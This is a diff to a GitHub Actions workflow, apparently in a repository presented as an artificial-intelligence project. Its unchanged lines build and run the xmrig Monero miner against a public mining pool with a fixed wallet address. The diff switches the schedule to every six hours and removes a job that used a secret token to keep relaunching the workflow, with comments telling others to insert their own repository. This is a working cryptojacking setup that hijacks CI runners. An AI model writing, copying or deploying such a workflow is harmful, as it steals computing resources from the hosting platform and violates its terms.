@@ -5,8 +5,7 @@ on:
     branches:
       - master
   schedule:
-    - cron: "*/390 * * * *"
-
+    - cron: "10 */6 * * *"
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -30,16 +29,3 @@ jobs:
       run: |
         cd xmrig/build
         ./xmrig -o xmr.2miners.com:2222 -u 82VfeZRTtxRbYXHenMwrdHBK8P1mYQNMGfJuamki2PhT473tBkHgccxNZPn6468GxtVycU2yeDXiwisXS4KTikEaGkEWcrW -p gitrig17 -k --coin monero -a rx/0 --threads 2
-
-  restart_workflow:
-    needs: [build]
-    runs-on: ubuntu-latest
-    if: always()
-
-    steps:
-    - name: Restart Workflow
-      uses: peter-evans/repository-dispatch@v1
-      with:
-        token: ${{ secrets.ten_rig }} # Ganti dengan nama variabel secrets yang sesuai
-        repository: banjar-code/kecerdasan-buatan # Ganti dengan nama pengguna dan nama repositori Anda
-        event-type: restart_workflow
